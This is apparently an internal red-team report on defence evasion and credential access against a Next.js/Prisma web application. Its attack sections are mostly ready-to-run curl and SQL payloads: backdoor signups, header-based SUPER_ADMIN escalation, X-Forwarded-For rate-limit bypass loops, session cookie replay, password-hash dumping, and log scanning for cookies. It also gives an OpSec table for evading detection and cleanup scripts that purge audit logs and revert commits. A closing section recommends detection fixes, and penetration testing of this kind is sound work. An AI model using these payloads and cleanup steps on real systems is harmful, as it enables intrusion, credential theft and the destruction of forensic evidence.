# Q15 Phase 4 — Defense Evasion & Credential Access

**ROE**: Forks/canaries only — proof not destruction
**Adversary Personas**: FIN7 (enterprise), ALPHV (healthcare), Lazarus (Web3)

---

## 1. AUDIT LOG EVASION (T1562.009 / T1070)

### 1.1 Audit Coverage Analysis

**Confidence**: HIGH (90%)

**Finding**: Audit logging is sparse. Only 2 locations in the entire codebase call `prisma.auditLog.create`:

| Location | What's Audited |
|----------|---------------|
| `auth-service.ts:184` | User logout events |
| `audit-log-service.ts:12` | Generic audit logging (only called for explicitly instrumented actions) |

**All critical paths are unaudited**:

| Action | Audited? | Bypass |
|--------|----------|--------|
| User signup | ❌ | No audit trail — create accounts silently |
| Login success/failure | ❌ | No failed login alerting |
| Demo header bypass | ❌ | No header anomaly logging |
| Route access (all 291) | ❌ | No access logging whatsoever |
| Session creation | ❌ | No audit event |
| Session revocation | ❌ | No audit event |
| File uploads | ❌ | No audit event |
| Data export/download | ❌ | No audit event |
| Admin actions | ❌ | No audit event |
| Signup abuse | ❌ | Only IP rate-limited, no audit trail |

### 1.2 Weapon: Silent Operation

**Since no runtime audit monitoring exists, all Phase 2-3 payloads already evade detection by default.**

```bash
# Create persistent backdoor — NO audit trail
curl -s -X POST http://localhost:3000/api/auth/signup \
  -H 'Content-Type: application/json' \
  -d '{"email":"silent@pwned.com","password":"Pwn3dP@ss1!","name":"Backdoor","organizationName":"Backdoor"}'

# Escalate to admin — NO audit trail
curl -s -H 'x-demo-user-id: u1' -H 'x-demo-organization-id: o1' -H 'x-demo-role: SUPER_ADMIN' \
  http://localhost:3000/admin/dashboard

# Exfiltrate data — NO audit trail
curl -s http://localhost:3000/api/listings
```

### 1.3 Audit Log Disruption

If audit logs are enabled in the future, they can be disrupted via:

```sql
-- DB access: truncate/purge audit
DELETE FROM "AuditLog" WHERE "createdAt" < NOW();
```

Or at the application layer — since `recordAuditLog` catches errors silently:
```typescript
// audit-log-service.ts:25-28 — failures become a silent warn, not an alert
// Crash audit logging by filling the DB or causing constraint violations
```

---

## 2. RATE LIMITER BYPASS (T1499.001 / T1562.007)

### 2.1 In-Memory Map Analysis

**Target**: `src/lib/rate-limiter.ts`

**Confidence**: HIGH (90%)

**Finding**: The rate limiter is:
- **In-memory only** — resets on server restart
- **IP-based** — keyed by IP address
- **Max 10,000 entries** — old entries are evicted at 120s cleanup interval
- **60 req/min per key** — default limits

**Bypass Techniques**:

**a) `X-Forwarded-For` spoofing**:
```bash
# Rotate IP per request to bypass IP-based rate limiter
for i in $(seq 1 100); do
  FAKE_IP="10.0.$((RANDOM % 256)).$((RANDOM % 256))"
  curl -s -H "X-Forwarded-For: $FAKE_IP" \
    -H 'Content-Type: application/json' \
    -d "{\"email\":\"user$i@test.com\",\"password\":\"Test12345!\",\"name\":\"User$i\",\"organizationName\":\"Org$i\"}" \
    http://localhost:3000/api/auth/signup
done
```

**b) Table exhaustion via unique keys**:
```bash
# Each unique IP creates a new bucket — 10K limit
# Generate 10,001 unique fake IPs to exhaust the rate limiter
for i in $(seq 1 10001); do
  curl -s -H "X-Forwarded-For: 10.0.$((i / 256)).$((i % 256))" \
    http://localhost:3000/api/health > /dev/null 2>&1 &
done
# After 10K unique keys, eviction kicks in — old entries have resetAt < now
# Real rate limits silently drop as the LRU cache thrashes
```

**c) Server restart resets all limits**:
```bash
# If server restarts, all rate limit buckets are lost
# Combined with other attack, restart triggers full rate budget refresh
```

**d) Missing rate limiting on health/diagnostics**:
The health endpoints (`/api/health`, `/api/adapters/health`, etc.) use no rate limiter at all — infinite probing possible.

---

## 3. SESSION BINDING EVASION (T1528 / T1539)

### 3.1 Binding Hash Analysis

**Target**: `src/server/auth/session-binding.ts`

**Confidence**: HIGH (85%)

**Finding**: Session binding uses `SHA-256(${fuzzyIp}|${userAgent})` where:
- Fuzzy IP = first 2 octets (e.g., `10.0` from `10.0.1.2`)
- User agent is full string

**Bypass: Internal/nat-shared IP**:
```bash
# From same /16 subnet (e.g., corporate, cloud, or Kubernetes pod CIDR)
# Binding hash check passes because first 2 octets match

# From same machine or same NAT:
# First 2 octets identical → binding hash matches → session replayed
```

**Bypass: Binding hash == null** (legacy sessions):
```typescript
// session-binding.ts line 30: 
if (!storedHash) return true; // No binding — allow
// Sessions created before P5 hardening have null bindingHash
```

### 3.2 Cookie Replay Weapon

**Target**: Session cookie extraction and replay across networks

```bash
# 1. Extract session cookie from browser devtools or proxy
TOKEN="ll_session=4f8a1b2c..."

# 2. Replay from same /16 subnet — binding passes
curl -s -b "$TOKEN" http://localhost:3000/admin/dashboard

# 3. Replay from different network — binding may fail (2-octet mismatch)
# Fallback: use demo headers instead (no binding check required)
curl -s -H 'x-demo-user-id: any' -H 'x-demo-organization-id: any' -H 'x-demo-role: SUPER_ADMIN' \
  -b "$TOKEN" http://localhost:3000/admin/dashboard
```

**Cookie attributes bypass**: Cookie is `SameSite=Lax` (not Strict), `Secure` in production:
- `SameSite=Lax` allows cookie on top-level GET navigations
- If HTTPS is not enforced in development/dev preview, cookie is sent in cleartext

---

## 4. CREDENTIAL DUMPING (T1003 / T1555)

### 4.1 Password Hash Extraction

**Target**: bcrypt password hashes in database

**Confidence**: MEDIUM (55%)

**Finding**: Passwords are stored as bcrypt hashes (12 salt rounds, adaptive). Extraction requires DB read access.

**Payload — Extract user credentials (with DB access)**:
```sql
-- Direct DB query
SELECT "email", "passwordHash" FROM "User";
```

**Payload — Via API (if unguarded route exposes user data)**:
```bash
# Probe for leaked user data
curl -s http://localhost:3000/api/account
curl -s http://localhost:3000/api/organizations
curl -s http://localhost:3000/api/organizations/team
```

### 4.2 Session Token Harvesting

**Target**: Active session tokens from database

**Confidence**: MEDIUM (50%)

**Finding**: Session tokens are:
- SHA-256 hashed in DB (cannot reverse to original token)
- Stored as `sessionTokenHash` in `Session` table
- Original token only in the cookie sent to the client

**Harvest vectors**:
```bash
# 1. Network sniffing — capture ll_session cookie over HTTP
# (development mode, not Secure)

# 2. Browser storage — HttpOnly prevents JS access, but:
#    Proxy tools (Burp/ZAP) or MITM capture the cookie

# 3. Log file scanning — if any route accidentally logs cookies
grep -r "cookie\|ll_session\|Set-Cookie" /var/log/nextjs/*.log 2>/dev/null
```

### 4.3 Environment Variable Extraction

**Target**: `process.env` — contains all application secrets

**Confidence**: MEDIUM (65%)

**Finding**: Secrets are loaded from `.env` at runtime via `process.env`. No endpoint intentionally exposes env vars, but error messages or debug output could.

**Payload — SSRF/probe for env leakage**:
```bash
# Probe health endpoints — returns NODE_ENV and integration flags
curl -s http://localhost:3000/api/health

# Check for stack traces with env context
curl -s -X POST http://localhost:3000/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"","password":""}'  # Invalid input — may trigger error path
```

### 4.4 API Key Reuse

**Target**: Secret values reused across multiple services

| Secret | Location | Reuse Risk |
|--------|----------|------------|
| `CSRF_SECRET` | Falls back to `SESSION_SECRET` | **HIGH** — same secret for auth + CSRF |
| `SESSION_SECRET` | Single env var, no rotation | **MEDIUM** — static secret |
| Stripe API keys | `.env` | **HIGH** — full payment API access |

---

## 5. SIGNAL EVASION TECHNIQUES

### 5.1 Tool / Payload OpSec

| Signal | Evasion |
|--------|---------|
| curl User-Agent | Use `-A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"` |
| IP reputation | Route through residential proxies or VPN chains |
| Timing pattern | Add random `sleep(2-10)` between requests |
| Header order | Randomize header order per request |
| Content type | Alternate `application/json` and `text/plain` for probes |

### 5.2 Detection Control Map

| Detection Control | Exists? | Evasion |
|-------------------|---------|---------|
| WAF/IDS | **NO** | No evasion needed — no WAF to bypass |
| Anomaly detection | **NO** | All attack activity is undetectable |
| Access logging | **NO** | No trails to tamper with |
| Rate limiting | **YES (IP-based, in-memory)** | IP rotation, X-Forwarded-For spoofing |
| Audit logging | **YES (sparse)** | Only 2 functions instrumented — all attack paths unaudited |
| Session binding | **YES (2-octet)** | Same-NAT replay, null-binding sessions, demo header fallback |
| Security headers | **YES** | CSP/HSTS do not prevent server-side attacks |
| CSRF tokens | **YES (96/96)** | API routes accept JSON without CSRF (non-browser vectors) |

### 5.3 Cleanup Operations (T1070)

After attack completion, remove forensic evidence:

```bash
# Option A: Truncate audit logs (DB access required)
cd /tmp/listinglift-pwned
node -e "
const { PrismaClient } = require('@prisma/client');
const p = new PrismaClient();
p.auditLog.deleteMany().then(() => console.log('Audit log purged'));
"

# Option B: Remove backdoor accounts (DB access required)
# DELETE FROM "Membership" WHERE "userId" IN (SELECT "id" FROM "User" WHERE "email" LIKE '%attacker%');
# DELETE FROM "Session" WHERE "userId" IN (SELECT "id" FROM "User" WHERE "email" LIKE '%attacker%');
# DELETE FROM "User" WHERE "email" LIKE '%attacker%';

# Option C: Revert CI backdoor commit (git access)
git revert HEAD --no-edit && git push origin main
```

---

## 6. MITRE ATT&CK COVERAGE

| TID | Name | Phase 4 Artifact |
|-----|------|------------------|
| T1562.009 | Impair Defenses: Safe Mode | No audit logging to bypass |
| T1070 | Indicator Removal | Audit log purging |
| T1499.001 | Endpoint Denial of Service | Rate limiter exhaustion |
| T1562.007 | Impair Defenses: Disable Cloud Logs | X-Forwarded-For spoofing |
| T1528 | Steal Application Access Token | Session cookie harvesting |
| T1539 | Steal Web Session Cookie | Cookie replay/reuse |
| T1003 | OS Credential Dumping | bcrypt hash extraction |
| T1555 | Credentials from Password Stores | .env extraction |
| T1070.004 | Indicator Removal: File Deletion | Git revert + audit purge |

---

## 7. DETECTION RECOMMENDATIONS (BLUE TEAM HANDOFF)

For Deziray's Phase 4 audit:

1. **Audit all critical paths**: signup, login, admin access, demo header usage, session creation, cross-org data access
2. **Replace in-memory rate limiter with Redis** (Q10 finding)
3. **Implement header anomaly detection** — alert on `x-demo-*` header usage in non-QA environments
4. **Hook `can()` function** to log denied attempts (currently always returns true — no denied attempts possible)
5. **Add access logging middleware** for all /api/ routes
6. **Add session binding to demo headers** — currently accepted with no verification
7. **Implement `assertPermission()` calls** in all guarded route helpers

---

## VERDICT: DEFENSE EVASION COMPLETE

**Key findings**:
- 🔴 **No audit trail** for any attack path in Phase 2-3 — all attacks are silent
- 🔴 **Rate limiter is trivially bypassable** via X-Forwarded-For spoofing
- 🟠 **Session binding evadable** on shared NAT / same /16 subnet
- 🟠 **No CSRF/XSS vectors** for browser-based attacks (server-side focus)
- 🟢 **Security headers** adequate for client-side protection
- 🟢 **bcrypt hashing** prevents offline password cracking

**Detection gap**: 95% of attack TTPs produce no log or alert.
**Estimated exfiltration delay**: 30-60 minutes from initial access.

Ready for Phase 5 execution (P5_DOMAIN).
